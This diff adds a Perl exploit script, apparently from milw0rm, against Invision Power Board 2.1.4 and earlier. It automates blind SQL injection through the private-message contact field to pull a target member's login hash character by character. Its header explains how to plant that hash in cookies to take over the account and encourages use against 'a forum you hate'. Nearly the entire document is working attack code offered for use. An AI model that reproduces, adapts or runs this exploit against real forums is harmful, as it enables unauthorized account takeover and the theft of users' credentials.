@@ -1,0 +1,187 @@
+#!/usr/bin/perl
+#############################################################################
+## IPB <=2.1.4 exploit (possibly 2.1.5 too)                                ##
+## Brought to you by the Ykstortion security team.                         ##
+##                                                                         ##
+## The bug is in the pm system so you must have a registered user.         ##
+## The exploit will extract a password hash from the forum's data base of  ##
+## the target user.                                                        ##
+## You need to know the target user's member ID but it's not difficult to  ##
+## find out, just look under their avatar next to one of their posts.      ##
+## Once you have the hash, simply unset all forum cookies and set          ##
+## member_id to the target user's member id and pass_hash to the hash      ##
+## obtained from the database by this script.                              ##
+##                                                                         ##
+## Usage:                                                                  ##
+##   $ ./ipb                                                               ##
+##   IPB Forum URL ? forums.example.com/forums                             ##
+##   Your username ? krypt_sk1dd13                                         ##
+##   Your pass ? if_your_on_nix_this_gets_hidden                           ##
+##   Target userid ? 3637                                                  ##
+##                                                                         ##
+##   Attempting to extract password hash from database...                  ##
+##   537ab2d5b37ac3a3632f5d06e8e04368                                      ##
+##   Hit enter to quit.                                                    ##
+##                                                                         ##
+## Requirements:                                                           ##
+##   o Perl 5                                                              ##
+##   o LWP 5.64 or later                                                   ##
+##   o Internet access                                                     ##
+##   o A forum you hate/dislike                                            ##
+##   o A user on said forum                                                ##
+##   o 32+ PMs left till your inbox is full, if not you can still delete   ##
+##     PMs from your inbox as the successful ones come through             ##
+##                                                                         ##
+## Credit to: Nuticulus for finding the SQL injection                      ##
+##                                                                         ##
+## Have fun, you dumb skiddie.                                             ##
+#############################################################################
+
+use HTTP::Cookies;
+use LWP 5.64;
+use HTTP::Request;
+
+# variables
+my $login_page = '?act=Login&CODE=01';
+my $pm_page = '?act=Msg&CODE=04';
+my $pose_pm_page = '?';
+my $tries = 5;
+my $sql = '';
+my $hash = '';
+my $need_null = 0;
+my $i;
+my $j;
+my @charset = ('0' .. '9', 'a' .. 'f');
+my %form = (act		=> 'Msg',
+	CODE		=> '04',
+	MODE		=> '01',
+	OID		=> '',
+	removeattachid	=> '',
+	msg_title	=> 'asdf',
+	bbmode		=> 'normal',
+	ffont		=> 0,
+	fsize		=> 0,
+	fcolor		=> 0,
+	LIST		=> ' LIST ',
+	helpbox		=> 'Insert Monotype Text (alt + p)',
+	tagcount	=> 0,
+	Post		=> 'jkl');
+	
+
+# objects
+my $ua = LWP::UserAgent->new;
+my $cj = HTTP::Cookies->new (file => "N/A", autosave => 0);
+my $resp;
+
+# init the cookie jar
+$ua->cookie_jar ($cj);
+
+# allow redirects on post requests
+push @{ $ua->requests_redirectable }, "POST";
+
+# get user input
+print 'IPB Forum URL ? ';
+chomp (my $base_url = <STDIN>);
+print 'Your username ? ';
+chomp (my $user = <STDIN>);
+$form{entered_name} = $user;
+print 'Your pass ? ';
+# systems without stty will error otherwise
+my $stty = -x '/bin/stty';
+system 'stty -echo' if $stty;		# to turn off echoing
+chomp (my $pass = <STDIN>);
+system 'stty echo' if $stty;		# to turn it back on
+print "\n" if $stty;
+print 'Target userid ? ';	# it'll say next to one of their posts
+chomp (my $tid = <STDIN>);
+
+# parse the given base url
+if ($base_url !~ m#^http://#) { $base_url = 'http://' . $base_url }
+if ($base_url !~ m#/$|index\.php$#) { $base_url .= '/' }
+
+do {
+	$resp = $ua->post ($base_url . $login_page,
+		[ UserName => $user,
+		  PassWord => $pass,
+		  CookieDate => 1,
+		]);
+} while ($tries-- && !$resp->is_success());
+
+# reset tries
+$tries = 5;
+
+# did we get 200 (OK) ?
+if (!$resp->is_success()) { die 'Error: ' . $resp->status_line . "\n" }
+
+# was the pass right ?
+if ($resp->content =~ /sorry, the password was wrong/i) {
+	die "Error: password incorrect.\n";
+}
+
+# get ourselves a post_key (and an auth_key too with newer versions)
+do {
+	$resp = $ua->get ($base_url . $pm_page);
+} while ($tries-- && !$resp->is_success());
+
+# reset tries
+$tries = 5;
+
+if (!$resp->is_success()) { die 'Error: ' . $resp->status_line . "\n" }
+if ($resp->content =~ m#<input\s+?type=["']?hidden["']?\s+?name=["']?post_key["']?\s+?value=["']?([0-9a-f]{32})["']?\s+?/>#)
+{
+	$form{post_key} = $1;
+} else {
+	die "Error: couldn't get a post key.\n";
+}
+if ($resp->content =~ m#<input\s+?type=["']?hidden["']?\s+?name=["']?auth_key["']?\s+?value=["']?([0-9a-f]{32})["']?\s+/>#)
+{
+	$form{auth_key} = $1;
+}
+
+# turn off buffering so chars in the hash show up straight away
+$| = 1;
+
+print "\nAttempting to extract password hash from database...\n ";
+
+OFFSET:
+for ($i = 0; $i < 32; ++$i) {
+	CHAR:
+	for ($j = 0; $j < @charset; ++$j) {
+		# reset tries
+		$tries = 5;
+		print "\x08", $charset[$j];
+		# build sql injection
+		$sql = '-1 UNION SELECT ' . ($need_null ? '0, ' : '') . 'CHAR('
+		     . (join (',', map {ord} split ('', $user))) . ') FROM '
+		     . 'ibf_members WHERE id = ' . $tid . ' AND MID('
+		     . 'member_login_key, ' . ($i + 1) . ', 1) = CHAR('
+		     . ord ($charset[$j]) . ')';
+		$form{from_contact} = $sql;
+		$resp = $ua->post ($base_url . $post_pm_page, \%form,
+			referer => $base_url . $pm_page);
+		if (!$resp->is_success()) {
+			die "\nError: " . $resp->status_line
+			  . "\n" if (!$tries);
+			--$tries;
+			redo;
+		}
+		if ($resp->content =~ /sql error/i) {
+			if ($need_null) {
+				die "Error: SQL error.\n";
+			} else {
+				$need_null = 1;
+				redo OFFSET;
+			}
+		} elsif ($resp->content !~ /there is no such member/i) {
+			# we have a winner !
+			print ' ';
+			next OFFSET;
+		}
+	}
+	# uh oh, something went wrong
+	die "\nError: couldn't get a char for offset $i\n";
+}
+print "\x08 \x08\nHit enter to quit.\n";
+<STDIN>;
+
+# milw0rm.com [2006-05-01]
